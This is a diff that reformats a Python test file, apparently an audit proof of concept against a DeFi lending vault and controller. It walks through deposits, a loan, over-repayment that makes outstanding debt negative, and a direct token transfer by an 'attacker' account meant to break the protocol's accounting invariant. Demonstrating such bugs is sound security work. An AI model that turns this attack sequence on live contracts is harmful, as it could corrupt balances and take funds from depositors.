@@ -43,33 +43,33 @@ def seed_liquidity():
 
 
 def test_prove_direct_transfer_breaks_invariant(
-        vault,
-        controller,
-        amm,
-        borrowed_token,
-        collateral_token,
-        accounts,
+    vault,
+    controller,
+    amm,
+    borrowed_token,
+    collateral_token,
+    accounts,
 ):
     user = accounts[1]
     user2 = accounts[2]
     attacker = accounts[3]
 
     # Setup users
-    boa.deal(borrowed_token, user, 500 * 10 ** 18)
-    boa.deal(collateral_token, user, 1000 * 10 ** 18)
-    boa.deal(borrowed_token, user2, 2000 * 10 ** 18)
-    boa.deal(collateral_token, user2, 1000 * 10 ** 18)
+    boa.deal(borrowed_token, user, 500 * 10**18)
+    boa.deal(collateral_token, user, 1000 * 10**18)
+    boa.deal(borrowed_token, user2, 2000 * 10**18)
+    boa.deal(collateral_token, user2, 1000 * 10**18)
 
     # Step 1: Users deposit
     with boa.env.prank(user):
         max_approve(borrowed_token, vault.address)
         max_approve(borrowed_token, controller.address)
         max_approve(collateral_token, controller.address)
-        vault.deposit(100 * 10 ** 18)
+        vault.deposit(100 * 10**18)
 
     with boa.env.prank(user2):
         max_approve(borrowed_token, vault.address)
-        vault.deposit(200 * 10 ** 18)
+        vault.deposit(200 * 10**18)
 
     print("\n=== Step 1: After deposits ===")
     print(f"  user shares: {vault.balanceOf(user)}")
@@ -80,7 +80,7 @@ def test_prove_direct_transfer_breaks_invariant(
 
     # Step 2: User borrows
     with boa.env.prank(user):
-        controller.create_loan(600 * 10 ** 18, 250 * 10 ** 18, MIN_TICKS)
+        controller.create_loan(600 * 10**18, 250 * 10**18, MIN_TICKS)
 
     print("\n=== Step 2: After borrow ===")
     print(f"  user shares: {vault.balanceOf(user)}")
@@ -106,7 +106,7 @@ def test_prove_direct_transfer_breaks_invariant(
     print(f"  debt: {debt_after_interest}")
 
     # Step 4: User repays more than borrowed (making outstanding negative)
-    remaining_debt_target = 10 * 10 ** 10
+    remaining_debt_target = 10 * 10**10
     repay_amount = debt_after_interest - remaining_debt_target
 
     with boa.env.prank(user):
@@ -131,7 +131,7 @@ def test_prove_direct_transfer_breaks_invariant(
     print(f"  outstanding: {outstanding_3} (NEGATIVE)")
 
     # Step 5: Attacker directly transfers to controller
-    direct_transfer_amount = 100 * 10 ** 18
+    direct_transfer_amount = 100 * 10**18
     print(f"  direct_transfer_amount: {direct_transfer_amount}")
     boa.deal(borrowed_token, attacker, direct_transfer_amount)
     with boa.env.prank(attacker):
@@ -204,33 +204,33 @@ attack flow:
 
 
 def test_poc_direct_transfer_breaks_invariant(
-        vault,
-        controller,
-        amm,
-        borrowed_token,
-        collateral_token,
-        accounts,
+    vault,
+    controller,
+    amm,
+    borrowed_token,
+    collateral_token,
+    accounts,
 ):
     attacker = accounts[1]
     user2 = accounts[2]
     # attacker = accounts[3]
 
     # Setup users
-    boa.deal(borrowed_token, attacker, 500 * 10 ** 18)
-    boa.deal(collateral_token, attacker, 1000 * 10 ** 18)
-    boa.deal(borrowed_token, user2, 2000 * 10 ** 18)
-    boa.deal(collateral_token, user2, 1000 * 10 ** 18)
+    boa.deal(borrowed_token, attacker, 500 * 10**18)
+    boa.deal(collateral_token, attacker, 1000 * 10**18)
+    boa.deal(borrowed_token, user2, 2000 * 10**18)
+    boa.deal(collateral_token, user2, 1000 * 10**18)
 
     # Step 1: Users deposit
     with boa.env.prank(user2):
         max_approve(borrowed_token, vault.address)
-        vault.deposit(200 * 10 ** 18)
+        vault.deposit(200 * 10**18)
 
     with boa.env.prank(attacker):
         max_approve(borrowed_token, vault.address)
         max_approve(borrowed_token, controller.address)
         max_approve(collateral_token, controller.address)
-        vault.deposit(100 * 10 ** 18)
+        vault.deposit(100 * 10**18)
 
     print("\n=== Step 1: After deposits ===")
     print(f"  attacker shares: {vault.balanceOf(attacker)}")
@@ -241,7 +241,7 @@ def test_poc_direct_transfer_breaks_invariant(
 
     # Step 2: attacker borrows close to net_deposits
     with boa.env.prank(attacker):
-        controller.create_loan(600 * 10 ** 18, 290 * 10 ** 18, MIN_TICKS)
+        controller.create_loan(600 * 10**18, 290 * 10**18, MIN_TICKS)
 
     print("\n=== Step 2: After borrow ===")
     print(f"  attacker shares: {vault.balanceOf(attacker)}")
@@ -265,7 +265,7 @@ def test_poc_direct_transfer_breaks_invariant(
     print(f"  debt: {debt_after_interest}")
 
     # Step 4: Attacker directly transfers to controller
-    direct_transfer_amount = 100 * 10 ** 18
+    direct_transfer_amount = 100 * 10**18
     print(f"  direct_transfer_amount: {direct_transfer_amount}")
     boa.deal(borrowed_token, attacker, direct_transfer_amount)
     with boa.env.prank(attacker):
